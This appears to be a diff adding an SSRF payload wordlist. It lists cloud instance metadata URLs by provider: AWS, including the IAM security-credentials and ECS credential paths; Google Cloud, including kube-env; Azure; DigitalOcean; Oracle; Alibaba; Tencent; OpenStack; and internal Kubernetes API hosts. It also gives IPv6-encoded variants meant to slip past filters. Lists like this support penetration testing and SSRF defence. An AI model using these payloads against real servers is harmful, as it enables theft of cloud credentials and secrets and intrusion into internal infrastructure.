@@ -1,0 +1,74 @@
+# AWS Metadata
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+
+# AWS ECS Task
+http://169.254.170.2/v2/credentials/
+
+# AWS IPv6 Variants
+http://[::ffff:169.254.169.254]
+http://[0:0:0:0:0:ffff:169.254.169.254]
+
+# Google Cloud Metadata
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+
+# Packetcloud
+https://metadata.packet.net/userdata
+
+# Azure
+http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+
+# OpenStack / RackSpace
+http://169.254.169.254/openstack
+http://169.254.169.254/openstack/2012-08-10/meta_data.json
+http://169.254.169.254/openstack/2018-08-27/network_data.json
+
+# HP Helion
+http://169.254.169.254/2009-04-04/meta-data/
+
+# Oracle Cloud
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+
+# Tencent Cloud
+http://100.88.222.5
+http://metadata.tencentyun.com/
+http://metadata.tencentyun.com/latest/meta-data/
+
+# Kubernetes Internal API
+https://kubernetes.default.svc.cluster.local
+https://kubernetes.default
+https://kubernetes.default.svc/metrics
